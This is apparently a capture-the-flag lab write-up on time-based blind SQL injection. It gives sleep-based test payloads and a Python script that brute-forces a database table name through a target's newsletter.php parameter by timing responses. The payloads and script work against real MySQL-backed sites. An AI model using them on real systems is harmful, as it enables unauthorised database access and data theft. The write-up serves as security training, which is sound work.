---
date: 2025-02-08
categories: [CTF, IML]
title: "IML - SQL Injection – Time-Based Blind"
tags: ['http', 'sql', 'sqli', 'rce']

description: "SQL Injection – Time-Based Bl - A walkthrough of the challenge with enumeration, exploitation and privilege escalation steps."
---

---
---

# IML - SQL Injection – Time-Based Blind

[https://github.com/kleiton0x00/Advanced-SQL-Injection-Cheatsheet/tree/main/MySQL%20-%20Time%20Based%20SQLi](https://github.com/kleiton0x00/Advanced-SQL-Injection-Cheatsheet/tree/main/MySQL%20-%20Time%20Based%20SQLi)

**<u>To test for time-based sqli:</u>**
Example:
```bash
http://domain.com/index.php?id=15'XOR(if(now()=sysdate(),sleep(5\*5),0))OR'
```
or use:
**' OR SLEEP(5) AND '1'='1**
or
**'AND (SELECT \* FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe**

If the websites hangs for a bit, it means it is vulnerable to this kind of attack


![image1](../resources/0ea334980e34492093c4a7564082592d.png)


![image2](../resources/048d06d477a3420e9537d1315fe5ded8.png)

- Edit script (below) with parameters


![image3](../resources/d5f84473a07445e39af788ad44b0c701.png)

DB_name (script below)


![image4](../resources/42d7108f995746d1973bb6b4cc360e77.png)

Table_name (script below)


![image5](../resources/a18612f005af4f699d29aec9ac07fad9.png)

Column_name(script below)


![image6](../resources/208b3c33cdbb47f586ad222089318e9f.png)

Find flag


![image7](../resources/f15c06b5f66e4b90a9d2128af08c19d0.png)

**Ignore capitals and weird characters**


![image8](../resources/4b57281e766f4f77a4225d5d83867ffb.png)

Make sure to put the queries in their own ( )

**<u>Time-Based Bruteforce Database name script</u>**


![image9](../resources/ded6c258929345789f2ffe7614ec744c.png)

**<u>Time-Based Bruteforce Table name script</u>**


![image10](../resources/72335977ed8b4427a695b6c17c6ab8f2.png)

**<u>Time-Based Bruteforce Column name script</u>**


![image11](../resources/db532af227954c6d8796124e71b2ed5e.png)

**<u>Find flag</u>**


![image12](../resources/b408bf05364d4936a6d8c932e17e473e.png)

**<u>Script:</u>**

```python
import requests
import sys
import time

# Send the payload to the vulnerable parameter on the target host
# If it takes 5 seconds or longer to get a reply, return True
def send_payload(ip, payload):
    start = time.time()
    r = requests.get(
        "http://%s/newsletter.php?name=test&email=test' OR IF (%s, sleep(5), 'NO') AND '1'='1'" % (ip, payload)
    )
    end = time.time()
    return (end - start) >= 5

# Brute-force the length of the database table name
# Then iterate over characters to brute-force the table name
def brute_db(ip):
    length = 0
    for i in range(0, 100):
        if send_payload(ip, "LENGTH((select table_name from information_schema.tables where table_schema=database()))='%d'" % i):
            length = i
            break

    print("Length: %d" % length)
    sys.stdout.write("Dumping: ")
    sys.stdout.flush()

    db_name = ""
    for i in range(1, length + 1):
        for j in range(96, 123):  # ASCII a-z
            if send_payload(ip, "SUBSTRING((select table_name from information_schema.tables where table_schema=database()),%d,1)='%s'" % (i, chr(j))):
                db_name += chr(j)
                sys.stdout.write(chr(j))
                sys.stdout.flush()
                break
    sys.stdout.write("\n")
    sys.stdout.flush()
    return db_name

def main():
    if len(sys.argv) != 2:
        print("Usage: python %s <ip>" % sys.argv[0])
        sys.exit(1)

    ip = sys.argv[1]
    db_name = brute_db(ip)
    print("DB name: %s" % db_name)

if __name__ == "__main__":
    main()


```